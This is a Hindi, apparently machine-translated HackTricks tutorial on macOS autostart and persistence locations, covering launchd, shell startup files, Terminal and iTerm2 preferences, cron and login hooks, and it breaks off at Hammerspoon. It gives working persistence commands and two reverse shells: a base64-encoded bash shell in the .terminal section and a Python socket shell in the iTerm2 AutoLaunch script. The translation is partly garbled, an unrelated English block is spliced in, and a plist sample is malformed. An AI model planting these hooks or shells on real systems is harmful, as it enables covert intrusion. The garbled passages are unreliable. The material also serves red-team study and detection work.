# macOS ऑटो स्टार्ट

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

यह खंड मुख्य रूप से ब्लॉग श्रृंखला [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) पर आधारित है, लक्ष्य है **अधिक ऑटोस्टार्ट स्थान** (यदि संभव हो) जोड़ना, **इंद्रधनुष्य तकनीकें** जो आजकल काम कर रही हैं उसके साथ macOS के नवीनतम संस्करण (13.4) और **आवश्यक** **अनुमतियाँ** को निर्दिष्ट करना।

## सैंडबॉक्स बाइपास

{% hint style="success" %}
यहाँ आपको सैंडबॉक्स बाइपास के लिए उपयोगी स्टार्ट स्थान मिलेंगे जो आपको कुछ को **एक फ़ाइल में लिखकर** और बहुत **सामान्य क्रिया** के लिए **प्रतीक्षा** करके **कुछ को आसानी से निष्पादित** करने देता है, एक निर्धारित **समय** या एक **क्रिया** जो आप साधारणत: सैंडबॉक्स के अंदर से बिना रूट अनुमतियों की आवश्यकता के कर सकते हैं।
{% endhint %}

### Launchd

* सैंडबॉक्स बाइपास के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बाइपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/Library/LaunchAgents`**
* **ट्रिगर**: पुनरारंभ
* रूट आवश्यक
* **`/Library/LaunchDaemons`**
* **ट्रिगर**: पुनरारंभ
* रूट आवश्यक
* **`/System/Library/LaunchAgents`**
* **ट्रिगर**: पुनरारंभ
* रूट आवश्यक
* **`/System/Library/LaunchDaemons`**
* **ट्रिगर**: पुनरारंभ
* रूट आवश्यक
* **`~/Library/LaunchAgents`**
* **ट्रिगर**: पुनरारंभ
* **`~/Library/LaunchDemons`**
* **ट्रिगर**: पुनरारंभ

{% hint style="success" %}
एक दिलचस्प तथ्य के रूप में, **`launchd`** में एक एम्बेडेड प्रॉपर्टी सूची है जो अन्य प्रसिद्ध सेवाएं शुरू करने के लिए जिन्हें launchd को शुरू करना है, शामिल है। इसके अलावा, इन सेवाओं में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` शामिल हो सकते हैं जिसका मतलब है कि वे चलाए जाने और सफलतापूर्वक पूरा किया जाना चाहिए।

यह तो स्वायत्त के कारण संशोधित नहीं किया जा सकता।
{% endhint %}

#### विवरण और शोषण

**`launchd`** OX S कर्नेल द्वारा स्टार्टअप पर पहला **प्रक्रिया** है और बंद करने पर अंतिम होने वाला है। यहें हमेशा **पीआईडी 1** होना चाहिए। यह प्रक्रिया **ASEP** **प्लिस्ट** में निर्दिष्ट की गई विन्यासों को **पढ़ेगा और निष्पादित** करेगा:

* `/Library/LaunchAgents`: प्रशासक द्वारा स्थापित प्रति-उपयोगकर्ता एजेंट
* `/Library/LaunchDaemons`: प्रशासक द्वारा स्थापित सिस्टम-व्यापी डेमन्स
* `/System/Library/LaunchAgents`: Apple द्वारा प्रदान किए गए प्रति-उपयोगकर्ता एजेंट्स।
* `/System/Library/LaunchDaemons`: Apple द्वारा प्रदान किए गए सिस्टम-व्यापी डेमन्स।

जब एक उपयोगकर्ता लॉग इन करता है, तो `/Users/$USER/Library/LaunchAgents` और `/Users/$USER/Library/LaunchDemons` में स्थित प्लिस्ट लॉग इन करने वाले उपयोगकर्ताओं की **अनुमतियों** के साथ शुरू हो जाते हैं।

**एजेंट्स और डेमन्स के मुख्य अंतर है कि एजेंट्स उपयोगकर्ता लॉग इन करते समय लोड होते हैं और डेमन्स सिस्टम स्टार्टअप पर लोड होते हैं** (क्योंकि एसएसएच जैसी सेवाएं हैं जो किसी भी उपयोगकर्ता को सिस्टम तक पहुंचने से पहले निष्पादित होने की आवश्यकता है)। इसके अलावा, एजेंट्स में जीयूआई का उपयोग किया जा सकता है जबकि डेमन्स को पिछले में चलाने की आवश्यकता होती है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
ऐसे मामले होते हैं जहां **एक एजेंट को उपयोगकर्ता लॉगिन करने से पहले निष्पादित किया जाना चाहिए**, इन्हें **प्रीलॉगिन एजेंट्स** कहा जाता है। उदाहरण के लिए, यह लॉगिन पर सहायक प्रौद्योगिकी प्रदान करने के लिए उपयोगी है। इन्हें `/Library/LaunchAgents` में भी पाया जा सकता है (एक उदाहरण के लिए [**यहाँ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) देखें)।

{% hint style="info" %}
नए डेमन या एजेंट कॉन्फ़िग फ़ाइलें **अगले बूट या** `launchctl load <target.plist>` **का उपयोग करके लोड की जाएंगी**। **इसके अलावा, .plist फ़ाइलें बिना उस एक्सटेंशन के भी लोड किया जा सकता है** `launchctl -F <file>` (हालांकि वे plist फ़ाइलें बूट के बाद स्वचालित रूप से लोड नहीं होंगी)।\
इसे `launchctl unload <target.plist>` के साथ **अनलोड** करना भी संभव है (इसके द्वारा इशारा किया गया प्रक्रिया समाप्त हो जाएगी),

सुनिश्चित करने के लिए कि कोई **चीज़** (जैसे ओवरराइड) **किसी एजेंट** या **डेमन** को **चलने से रोक रही है**, चलाएं: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

वर्तमान उपयोगकर्ता द्वारा लोड किए गए सभी एजेंट और डेमन की सूची:
```bash
launchctl list
```
{% hint style="warning" %}
अगर एक plist किसी उपयोगकर्ता द्वारा स्वामित्व में है, तो यदि यह एक डेमन सिस्टम वाइड फोल्डर में है, **कार्य उपयोगकर्ता के रूप में** और न कि रूट के रूप में निष्पादित किया जाएगा। यह कुछ प्रिविलेज उन्नति हमलों को रोक सकता है।
{% endhint %}

#### लॉन्चड के बारे में अधिक जानकारी

**`launchd`** **कर्नेल** से शुरू किया जाने वाला **पहला** उपयोगकर्ता मोड प्रक्रिया है। प्रक्रिया प्रारंभ होना **सफल** होना चाहिए और यह **बाहर नहीं निकल सकता या क्रैश** हो सकता है। यह कुछ **किलिंग सिग्नल** के खिलाफ भी **सुरक्षित** है।

`launchd` की पहली चीजों में से एक है कि यह सभी **डेमन** को **शुरू** करेगा जैसे:

* समय के आधार पर निष्पादित होने वाले **टाइमर डेमन**:
* atd (`com.apple.atrun.plist`): `StartInterval` 30 मिनट है
* crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval` 00:15 पर शुरू होने के लिए
* **नेटवर्क डेमन** जैसे:
* `org.cups.cups-lpd`: TCP में सुनता है (`SockType: stream`) जिसमें `SockServiceName: printer` है
* &#x20;SockServiceName या तो एक पोर्ट होना चाहिए या `/etc/services` से सेवा होनी चाहिए
* `com.apple.xscertd.plist`: पोर्ट 1640 में TCP पर सुनता है
* जब एक निर्दिष्ट पथ परिवर्तित होता है, तो वे निष्पादित होने वाले **पथ डेमन**:
* `com.apple.postfix.master`: `/etc/postfix/aliases` पथ की जांच कर रहा है
* **IOKit सूचना डेमन**:
* `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach पोर्ट:**
* `com.apple.xscertd-helper.plist`: इसमें `MachServices` प्रविष्टि में नाम `com.apple.xscertd.helper` दिखा रहा है
* **UserEventAgent:**
* यह पिछले से अलग है। यह विशेष घटना के प्रतिक्रिया में ऐप्स को निष्पादित करने के लिए launchd को बनाता है। हालांकि, इस मामले में, मुख्य बाइनरी शामिल नहीं है `launchd` बल्कि `/usr/libexec/UserEventAgent` है। यह SIP प्रतिबंधित फ़ोल्डर /System/Library/UserEventPlugins/ से प्लगइन्स लोड करता है जहां प्रत्येक प्लगइन अपने `XPCEventModuleInitializer` कुंजी में अपना प्रारंभक दर्शाता है या, पुराने प्लगइन्स के मामले में, इसके `Info.plist` के `CFPluginFactories` डिक्शनरी के कुंजी `FB86416D-6164-2070-726F-70735C216EC0` के तहत अपना प्रारंभक दर्शाता है।

### शैल स्टार्टअप फ़ाइलें

लेखन: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
लेखन (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* सैंडबॉक्स को उम्मीद से बाहर निकालने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको एक एप्लिकेशन ढूंढने की आवश्यकता है जिसमें TCC बायपास हो जो एक शैल लोड करता है जो ये फ़ाइलें लोड करता है

#### स्थान

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल खोलें
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल खोलें
* रूट की आवश्यकता है
* **`~/.zlogout`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल बंद करें
* **`/etc/zlogout`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल बंद करें
* रूट की आवश्यकता है
* संभावना है कि और भी हो: **`man zsh`**
* **`~/.bashrc`**
* **ट्रिगर**: bash के साथ एक टर्मिनल खोलें
* `/etc/profile` (काम नहीं किया)
* `~/.profile` (काम नहीं किया)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **ट्रिगर**: xterm के साथ ट्रिगर किया जाना अपेक्षित है, लेकिन यह **स्थापित नहीं है** और इसके बाद भी इस त्रुटि को फेंका जाता है: xterm: `DISPLAY is not set`

#### विवरण और शोषण

`zsh` या `bash` जैसे शैल पर्यावरण को प्रारंभ करते समय **निश्चित स्टार्टअप फ़ाइलें** चलाई जाती हैं। macOS वर्तमान में डिफ़ॉल्ट शैल के रूप में `/bin/zsh` का उपयोग करता है। यह शैल स्वचालित रूप से एक्सेस किया जाता है जब टर्मिनल एप्लिकेशन लॉन्च किया जाता है या जब एक डिवाइस SSH के माध्यम से एक्सेस किया जाता है। जबकि `bash` और `sh` भी macOS में मौजूद हैं, उन्हें उपयोग करने के लिए स्पष्ट रूप से आमंत्रित किया जाना चाहिए।

हम **`man zsh`** के साथ पढ़ सकते हैं जो शैल स्टार्टअप फ़ाइलों का विवरण देता है।
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### फिर से खुली एप्लिकेशन

{% hint style="danger" %}
सूचित शोषण और लॉग-आउट और लॉग-इन या यहाँ तक कि बूट करने से मेरे लिए ऐप को निष्पादित करने में काम नहीं आया। (शायद ऐप निष्पादित नहीं हो रहा था, शायद यह चाहिए कि ये क्रियाएँ किए जाते समय यह चल रहा हो)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC छलावा: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **ट्रिगर**: एप्लिकेशन फिर से खोलने को पुनरारंभ करें

#### विवरण और शोषण

सभी एप्लिकेशन फिर से खोलने के लिए `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` में हैं।

इसलिए, अपनी एप्लिकेशन को सूची में जोड़ने के लिए बस **अपनी एप्लिकेशन को जोड़ें**।

UUID उस निर्देशिका को सूचीबद्ध करने या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` के साथ पाया जा सकता है।

फिर से खोले जाने वाले एप्लिकेशनों की जांच करने के लिए आप यह कर सकते हैं:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**इस सूची में एक एप्लिकेशन जोड़ने** के लिए आप इस्तेमाल कर सकते हैं:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### टर्मिनल प्राथमिकताएँ

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC छलना: [✅](https://emojipedia.org/check-mark-button)
* उपयोगकर्ता की एफडीए अनुमतियों को टर्मिनल का उपयोग करने के लिए

#### स्थान

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **ट्रिगर**: टर्मिनल खोलें

#### विवरण और शोषण

**`~/Library/Preferences`** में एप्लिकेशन में उपयोगकर्ता की प्राथमिकताएँ संग्रहित होती हैं। इन प्राथमिकताओं में से कुछ प्राथमिकताएँ **अन्य एप्लिकेशन/स्क्रिप्ट को निष्पादित** करने के लिए एक विन्यास रख सकती हैं।

उदाहरण के लिए, टर्मिनल स्टार्टअप में एक कमांड निष्पादित कर सकती है:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह विन्यास फ़ाइल **`~/Library/Preferences/com.apple.Terminal.plist`** में इस प्रकार दर्शाया जाता है:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
इसलिए, अगर सिस्टम में टर्मिनल की प्राथमिकताओं का प्लिस्ट अधिलिखित किया जा सकता है, तो **`open`** कार्यक्षमता का उपयोग करके **टर्मिनल खोली जा सकती है और उस कमांड को क्रियान्वित किया जाएगा**।

आप इसे कमांड लाइन से जोड़ सकते हैं:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### टर्मिनल स्क्रिप्ट / अन्य फ़ाइल एक्सटेंशन

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* उपयोगकर्ता को इस्तेमाल करने की अनुमतियाँ होने के लिए टर्मिनल का उपयोग करें

#### स्थान

* **कहीं भी**
* **ट्रिगर**: टर्मिनल खोलें

#### विवरण और शोषण

यदि आप एक [**`.terminal`** स्क्रिप्ट](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) बनाते हैं और उसे खोलते हैं, तो **टर्मिनल एप्लिकेशन** स्वचालित रूप से आमंत्रित होगा ताकि वहाँ निर्दिष्ट कमांड को निष्पादित कर सके। यदि टर्मिनल ऐप के पास कुछ विशेष अधिकार हैं (जैसे TCC), तो आपका कमांड उन विशेष अधिकारों के साथ चलाया जाएगा।

इसे इसके साथ आजमाएं:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### ऑडियो प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
लेख: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🟠](https://emojipedia.org/large-orange-circle)
* आपको कुछ अतिरिक्त TCC एक्सेस मिल सकता है

#### स्थान

* **`/Library/Audio/Plug-Ins/HAL`**
* रूट की आवश्यकता
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें
* **`/Library/Audio/Plug-ins/Components`**
* रूट की आवश्यकता
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें
* **`~/Library/Audio/Plug-ins/Components`**
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें
* **`/System/Library/Components`**
* रूट की आवश्यकता
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें

#### विवरण

पिछले लेखों के अनुसार **कुछ ऑडियो प्लगइन्स को कंपाइल** करना संभव है और उन्हें लोड करने में सक्षम हो सकता है।

### क्विकलुक प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🟠](https://emojipedia.org/large-orange-circle)
* आपको कुछ अतिरिक्त TCC एक्सेस मिल सकता है

#### स्थान

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### विवरण और शोषण

QuickLook प्लगइन्स को आप जब **फ़ाइल का पूर्वावलोकन ट्रिगर करते हैं** (फाइंडर में चयनित फ़ाइल के साथ स्पेस बार दबाएं) और एक **फ़ाइल प्रकार का समर्थन करने वाला प्लगइन** स्थापित होता है, तो उन्हें निष्पादित किया जा सकता है।

अपना खुद का QuickLook प्लगइन कंपाइल करना संभव है, उसे पिछले स्थानों में रखना और फिर समर्थित फ़ाइल पर जाने और उसे ट्रिगर करने के लिए स्पेस दबाने के लिए जाना।

### ~~लॉगिन/लॉगआउट हुक्स~~

{% hint style="danger" %}
यह मेरे लिए काम नहीं किया, न तो उपयोगकर्ता लॉगिनहुक और न ही रूट लॉगआउटहुक
{% endhint %}

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* आपको `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` जैसी कुछ चला सकने की आवश्यकता है
* `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

वे पुराने हो गए हैं लेकिन उपयोगकर्ता लॉग इन करते समय कमांड निष्पादित करने के लिए उपयोग किए जा सकते हैं।
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में स्टोर की जाती है।
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
इसे हटाने के लिए:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
**रूट उपयोगकर्ता** का एक स्थान **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** में संग्रहीत है।

## शर्ताधीन सैंडबॉक्स बाईपास

{% hint style="success" %}
यहाँ आपको **सैंडबॉक्स बाईपास** के लिए उपयोगी स्थान मिलेगा जो आपको बस किसी चीज को **एक फ़ाइल में लिखकर** उसे **कुछ अद्वितीय स्थितियों** जैसे कि विशेष **प्रोग्राम स्थापित, "असामान्य" उपयोगकर्ता** क्रियाएँ या परिदृश्यों की उम्मीद नहीं है।
{% endhint %}

### क्रॉन

**लेखन**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* हालांकि, आपको `crontab` बाइनरी को निष्पादित करने की क्षमता होनी चाहिए
* या फिर रूट होना चाहिए
* TCC बाईपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* सीधी लेखन पहुंच के लिए रूट की आवश्यकता है। यदि आप `crontab <file>` को निष्पादित कर सकते हैं तो रूट की आवश्यकता नहीं है
* **ट्रिगर**: क्रॉन जॉब पर निर्भर करेगा

#### विवरण और शोषण

**वर्तमान उपयोगकर्ता** के क्रॉन जॉब्स की सूची निम्नलिखित है:
```bash
crontab -l
```
आप यूज़र्स के सभी cron jobs को **`/usr/lib/cron/tabs/`** और **`/var/at/tabs/`** में देख सकते हैं (रूट की आवश्यकता है)।

मैकओएस में कई फोल्डर्स मिल सकते हैं जो **निश्चित अक्षरीयता** के साथ स्क्रिप्ट्स को निष्पादित करते हैं:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
वहाँ आपको नियमित **cron** **जॉब्स**, **at** **जॉब्स** (जो बहुत कम प्रयोग होते हैं) और **periodic** **जॉब्स** (मुख्य रूप से अस्थायी फ़ाइलें साफ करने के लिए प्रयोग होते हैं) मिल सकते हैं। दैनिक periodic jobs को उदाहरण के लिए इस प्रकार से निष्पादित किया जा सकता है: `periodic daily`।

**उपयोगकर्ता cronjob कार्यक्रमात्मक रूप से जोड़ने** के लिए निम्नलिखित का प्रयोग किया जा सकता है:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* बालूबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 का उपयोग TCC अनुमतियों को प्रदान करने के लिए किया गया था

#### स्थान

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **ट्रिगर**: iTerm खोलें
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **ट्रिगर**: iTerm खोलें
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **ट्रिगर**: iTerm खोलें

#### विवरण और शोषण

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** में संग्रहीत स्क्रिप्ट क्रियान्वित किए जाएंगे। उदाहरण के लिए:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### macOS Auto Start Locations

#### Launch Agents

Launch Agents are used to run processes when a user logs in. They are located in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch Daemons are used to run processes at system boot or login. They are located in `/Library/LaunchDaemons/` and `/System/Library/LaunchDaemons/`.

#### Login Items

Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
स्क्रिप्ट **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** भी निष्पादित किया जाएगा:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 प्राथमिकताएं **`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित हैं जो **इसका संकेत दे सकती हैं कि कौन सा कमांड निष्पादित किया जाए** जब iTerm2 टर्मिनल खोला जाता है।

यह सेटिंग iTerm2 सेटिंग्स में कॉन्फ़िगर की जा सकती है:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और कमांड प्राथमिकताओं में प्रतिबिम्बित होता है:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
आप निम्नलिखित के साथ कमांड सेट कर सकते हैं:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
उच्च संभावना है कि **iTerm2 preferences** का दुरुपयोग करने के लिए **अन्य तरीके** हों।
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन xbar को स्थापित किया जाना चाहिए
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह पहुंचने की अनुमतियां मांगता है

#### स्थान

* **`~/Library/Application\ Support/xbar/plugins/`**
* **ट्रिगर**: एक बार xbar क्रियान्वित होता है

#### विवरण

यदि लोकप्रिय कार्यक्रम [**xbar**](https://github.com/matryer/xbar) स्थापित है, तो संभावना है कि **`~/Library/Application\ Support/xbar/plugins/`** में एक शैल स्क्रिप्ट लिखा जा सकता है जो xbar को शुरू होने पर क्रियान्वित होगा:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### हैमरस्पून

**लेखन**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन हैमरस्पून को स्थापित किया जाना चाहिए
* TCC छलांग: [✅](https://emojipedia.org/check-mark-button)
* यह पहुंचने की अनुमतियाँ मांगता है

#### स्थान

* **`~/.hammerspoon/init.lua`**
* **ट्रिगर**: जब हैमरस्पून क्रियान्वित होता है

#### विवरण

